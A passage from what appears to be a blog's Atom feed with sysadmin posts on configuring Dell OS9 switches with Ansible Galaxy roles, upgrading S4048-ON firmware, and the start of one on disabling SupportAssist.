+        &lt;span class=&quot;na&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;yes&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;galaxy-roles&quot;&gt;Galaxy roles&lt;/h2&gt;
+
+&lt;p&gt;Dell EMC Open-Source Community in &lt;a href=&quot;https://github.com/Dell-Networking&quot;&gt;Github&lt;/a&gt; provides many Galaxy roles.
+But it is just a wrapper on the modules explained earlier.
+It provide a good interface to edit a network configure as structured YAML variables stored in files.
+See a full list of the Galaxy roles &lt;a href=&quot;https://ansible-dellos-docs.readthedocs.io/en/latest/roles.html&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;To use these Dell Galaxy roles you need to download them. Define all roles that you want download into a file like &lt;a href=&quot;/eng-blog/assets/files/dell/dellemc_roles.yml&quot;&gt;this mine&lt;/a&gt;. I prefer to save an all external roles into a local directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./ansible_roles&lt;/code&gt;.
+So this file I will save into this directory. After that run a command to download them:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ansible-galaxy install -r ansible-roles/dellemc_roles.yml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next write a new playbook to run some tasks defined in the downloaded Galaxy roles.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Playbook - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dell-switch-configure.yml&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;switch10g_new&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;gather_facts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;# become: yes&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;# become_method: enable&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;local&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;# connection: network_cli&lt;/span&gt;
+
+  &lt;span class=&quot;na&quot;&gt;roles&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ansible-roles/Dell-Networking.dellos-system&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ansible-roles/Dell-Networking.dellos-interface&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ansible-roles/Dell-Networking.dellos-vlan&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Host variables - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host_vars/switch10g_new.yaml&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# https://galaxy.ansible.com/Dell-Networking/dellos-system&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;dellos_system&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;inventory_hostname&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# https://galaxy.ansible.com/Dell-Networking/dellos-interface&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;dellos_interface&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# interface TenGigabitEthernet 1/22&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   description T-GPU1&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   no ip address&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   portmode hybrid&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   switchport&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   no shutdown&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;TenGigabitEthernet 1/22&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;T-GPU1&quot;&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ip_and_mask&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# set up `no ip address`&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;portmode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;hybrid&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# pass both untagged and tagged VLANs&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;switchport&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# ip_type_dynamic: true # Configures IP address DHCP if set to true (ip_and_mask is ignored if set to true)&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# ip_and_mask: 192.168.23.22/24 # Configures the specified IP address (192.168.11.1/24 format)&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;up&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# enables the interface&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# interface Port-channel 1&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   no ip address&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   switchport&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#   no shutdown&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;port-channel 1&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ip_and_mask&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;switchport&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;up&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# interface Vlan 3&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  description C-DATA&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  no ip address&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  tagged Port-channel 1&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  untagged TenGigabitEthernet 1/22&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#  no shutdown&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;vlan 3&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C-DATA&quot;&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ip_and_mask&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# to configure vlan use dellos-vlan role (see next)&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;up&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# https://galaxy.ansible.com/Dell-Networking/dellos-vlan&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;dellos_vlan&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;vlan 3&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C-DATA&quot;&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;tagged_members&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Port-channel&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&quot;&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;untagged_members&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TenGigabitEthernet&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1/22&quot;&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;present&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Explanation of tasks
+This playbook set up a hostname of a device as inventory hostname. After that it configures interfaces &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;te1/22&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;po1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vlan 3&lt;/code&gt;. If it does not existing it will create. Next we add members to created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vlan 3&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This YAML-file easy to read and it explains capability and power of these galaxy roles. Read more about them in &lt;a href=&quot;https://ansible-dellos-docs.readthedocs.io/en/latest/roles.html&quot;&gt;Documentation pages&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;In this post I explain the configuration process of network device without console.
+With Ansible you can make changes with many devices in one time.
+File of configuration easy to read (because it stored in YAML). All tasks could be saved into Git repository.
+Futhermore it could possible to update and apply changes with your CI/CD tool.&lt;/p&gt;
+
+&lt;p&gt;Also I save all sources into &lt;a href=&quot;https://github.com/GRomR1/dell-ansible-playbook&quot;&gt;GitHub&lt;/a&gt;. You can read all practical examples and clone it.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://galaxy.ansible.com/Dell-Networking&quot;&gt;Dell-Networking page on Ansible Galaxy&lt;/a&gt; - where placed all galaxy roles written by Community&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ansible-dellos-docs.readthedocs.io/en/latest/intro.html&quot;&gt;Dell Command Line Reference Guide for the S4048–ON System&lt;/a&gt; - Dell documentation explains Dell EMC Ansible integration&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/modules/list_of_network_modules.html#dellos9&quot;&gt;Dellos9 page on Ansible Modules&lt;/a&gt; - read more about explained modules&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/Dell-Networking/ansible-dellos-examples&quot;&gt;GitHub - Dell-Networking - ansible-dellos-examples&lt;/a&gt; - Sample Ansible playbooks to understand how the Dell EMC Networking Anisble Module works.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="devops" /><category term="dell" /><category term="networks" /><category term="ansible" /><category term="devops" /><summary type="html">Use Ansible playbooks to easy configure Dell Networking OS9 system. The post contains many practical examples of using dellos9 modules</summary></entry><entry><title type="html">DELL. Upgrade firmware on Dell S4048 switch (S-series, OS9)</title><link href="https://gainanov.pro/eng-blog/sysad/dell-switch-upgrade-firmware/" rel="alternate" type="text/html" title="DELL. Upgrade firmware on Dell S4048 switch (S-series, OS9)" /><published>2020-07-21T00:00:00+03:00</published><updated>2020-07-21T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/sysad/dell-switch-upgrade-firmware</id><content type="html" xml:base="https://gainanov.pro/eng-blog/sysad/dell-switch-upgrade-firmware/">&lt;p&gt;Today I would like install the last version of the Dell networking OS9 system.
+Follow to my guide I tested on my Dell PowerSwitch &lt;a href=&quot;https://i.dell.com/sites/doccontent/shared-content/data-sheets/en/Documents/Dell-EMC-Networking-S4048-ON-Spec-Sheet.pdf&quot;&gt;S4048-ON&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;
+
+&lt;p&gt;I already configure management interface and ssh server. Read my &lt;a href=&quot;/eng-blog/sysad/dell-ssh-server-configure/&quot;&gt;previous&lt;/a&gt; post if you didn’t make it.&lt;/p&gt;
+
+&lt;h2 id=&quot;download-the-latest-firmware&quot;&gt;Download the latest firmware&lt;/h2&gt;
+
+&lt;p&gt;Open the browser. Enter to the site &lt;a href=&quot;https://www.force10networks.com/&quot;&gt;force10networks&lt;/a&gt;. It requires an account.
+Register the user. Fill the Register form and put &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DELL&lt;/code&gt; as a Force10 contact. You will receive after 2 or 3 days your credential.&lt;/p&gt;
+
+&lt;p&gt;Follow to the &lt;a href=&quot;https://www.force10networks.com/CSPortal20/Software/SSeriesDownloads.aspx&quot;&gt;link&lt;/a&gt;.
+The Software Center page will be open. Try to find by switch name - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;S4048-ON&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;In the head of table you see the last version of firmware. Download the file with name - &lt;a href=&quot;https://www.force10networks.com/CSPortal20/Software/software/FTOS-SK-9.14.2.7.bin&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTOS-SK-9.14.2.7.bin&lt;/code&gt;&lt;/a&gt;. The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ONIE-FTOS-SK-xxx&lt;/code&gt; need to update system by ONIE loader. We will upgrading system with easy way.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/dell-switch/dell-switch-last-firmware.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/dell-switch/dell-switch-last-firmware.png&quot; alt=&quot;last-firmware&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Also download and carefully read the &lt;a href=&quot;https://www.force10networks.com/CSPortal20/Software/documentation/S4048-ON-9.14.2.7-RN.pdf&quot;&gt;Release Notes&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;check-the-current-system&quot;&gt;Check the current system&lt;/h2&gt;
+
+&lt;p&gt;The commands below will show a useful information about your device:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show os-version&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show system stack-unit 1&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show revision&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show version&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show boot sys stack-unit all&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I recommend to run them before upgrade the firmware. It could help to prevent any errors if it will be.&lt;/p&gt;
+
+&lt;p&gt;For example my output of the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show version&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# show version
+
+Dell EMC Real Time Operating System Software
+Dell EMC Operating System Version:  2.0
+Dell EMC Application Software Version:  9.13(0.1)
+Copyright (c) 1999-2018 by Dell Inc. All Rights Reserved.
+Build Time: Tue Feb 27 09:27:11 2018
+Build Path: /build/build05/SW/SRC
+Dell EMC Networking OS uptime is 1 week(s), 1 day(s), 10 hour(s), 59 minute(s)
+
+System image file is &quot;system://A&quot;
+
+System Type: S4048-ON
+Control Processor: Intel Rangeley with 3 Gbytes (3201302528 bytes) of memory, core(s) 2.
+
+8G bytes of boot flash memory.
+
+  1 54-port TE/FG (SK-ON)
+ 48 Ten GigabitEthernet/IEEE 802.3 interface(s)
+  6 Forty GigabitEthernet/IEEE 802.3 interface(s)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So my current version of system - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9.13(0.1)&lt;/code&gt;. And I will upgrade to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9.14(2.7)&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;backup-configuration&quot;&gt;Backup configuration&lt;/h2&gt;
+
+&lt;p&gt;Dell EMC Networking recommends that you back up your startup configuration and any important files and directories to an external media prior to upgrading the system.&lt;/p&gt;
+
+&lt;p&gt;Run the copy command to save running-config to some network host by SSH:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;copy running-config scp:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;upgrading&quot;&gt;Upgrading&lt;/h2&gt;
+
+&lt;p&gt;Follow these steps carefully to upgrade your S4048-ON systems.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Copy Firmware from my Mac to flash memory on device&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# copy scp://admin:some_strong_password@192.168.101.3 flash://FTOS-SK-9.14.2.7.bin
+
+Source file name []: /Users/admin/Documents/dell/firmware/FTOS-SK-9.14.2.7.bin
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+72581613 bytes successfully copied
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Verify a hash sum (it should be the same as presented in Download page)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# verify md5 FTOS-SK-9.14.2.7.bin
+MD5 hash for FTOS-SK-9.14.2.7.bin : ae09a0042db441291b119708b890bb8c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Upgrade the Dell EMC Networking OS in flash partition &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A:&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B:&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# upgrade system flash://FTOS-SK-9.14.2.7.bin A:
+
+!................................................!
+72581613 bytes successfully copied
+System image upgrade completed successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Verify that the Dell EMC Networking OS has been upgraded correctly in the upgraded flash partition&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# show boot system stack-unit all
+
+Current system image information in the system:
+===============================================
+
+Type          Boot Type       A                                  B
+----------------------------------------------------------------------------------------------
+stack-unit 1  FLASH BOOT      9.14(2.7)[boot]                    9.13(0.1)                         
+stack-unit 2 is not present.
+stack-unit 3 is not present.
+stack-unit 4 is not present.
+stack-unit 5 is not present.
+stack-unit 6 is not present.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;NOTE: If your boot flash partition is different then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A:&lt;/code&gt;
+You should change the Primary Boot Parameter - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DellEMC(conf)# boot system stack-unit 1 primary system: A:&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Save the configuration so that the configuration will be retained after a reload using write memory command.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# write memory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Reload the unit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# reload
+
+Proceed with reload [confirm yes/no]: yes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;verification&quot;&gt;Verification&lt;/h2&gt;
+
+&lt;p&gt;Verify the switch has been upgraded to the Dell EMC Networking OS version 9.14(2.7)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DellEMC# show version
+
+Dell EMC Real Time Operating System Software
+Dell EMC Operating System Version:  2.0
+Dell EMC Application Software Version:  9.14(2.7)
+Copyright (c) 1999-2019 by Dell Inc. All Rights Reserved.
+Build Time: Tue Jun 23 09:25:55 2020
+Build Path: /build/build02/SW/SRC
+Dell EMC Networking OS uptime is 12 hour(s), 53 minute(s)
+
+System image file is &quot;system://A&quot;
+
+System Type: S4048-ON
+Control Processor: Intel Rangeley with 3 Gbytes (3201302528 bytes) of memory, core(s) 2.
+
+8G bytes of boot flash memory.
+
+  1 54-port TE/FG (SK-ON)
+ 48 Ten GigabitEthernet/IEEE 802.3 interface(s)
+  6 Forty GigabitEthernet/IEEE 802.3 interface(s)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;I spend more time to understand how to upgrade the system then the switch is upgrading.
+I’m hope this article could save a time you. Have a nice flashing.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.force10networks.com/CSPortal20/Software/SSeriesDownloads.aspx&quot;&gt;Software Center for Force10 devises&lt;/a&gt; - site where the firmware for Dell devices placed&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dell.com/support/manuals/us/en/19/force10-s4048-on/s4048-on-9.14.0.0-cli/about-this-guide&quot;&gt;Dell Command Line Reference Guide for the S4048–ON System&lt;/a&gt; - dell man page included full command list&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="sysad" /><category term="dell" /><category term="networks" /><category term="firmware" /><summary type="html">Instructions for upgrading the last firmware of Dell Networking system.</summary></entry><entry><title type="html">DELL. Disabling SupportAssist on switch</title><link href="https://gainanov.pro/eng-blog/sysad/dell-smartassist-disable/" rel="alternate" type="text/html" title="DELL. Disabling SupportAssist on switch" /><published>2020-07-20T00:00:00+03:00</published><updated>2020-07-20T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/sysad/dell-smartassist-disable</id><content type="html" xml:base="https://gainanov.pro/eng-blog/sysad/dell-smartassist-disable/">&lt;p&gt;I am continuing write articles about DELL Networking System (OS9 series). This short note will show how to disable SupportAssist, enabled by default installation.&lt;/p&gt;
+
+&lt;h2 id=&quot;about-supportassist&quot;&gt;About SupportAssist&lt;/h2&gt;
+
+&lt;p&gt;SupportAssist sends troubleshooting data securely to Dell. SupportAssist does not support automated email notification at the time of hardware fault alert, automatic case creation, automatic part dispatch, or reports. SupportAssist requires Dell EMC Networking OS9.&lt;/p&gt;
+
+&lt;h2 id=&quot;about-problem&quot;&gt;About problem&lt;/h2&gt;
+
+&lt;p&gt;Every time I log in to my Dell switch I see this:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; The SupportAssist EULA acceptance option has not been selected. SupportAssist
+ can be enabled once the SupportAssist EULA has been accepted. Use the:
+ 'support-assist activate' command to accept EULA and enable SupportAssist.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
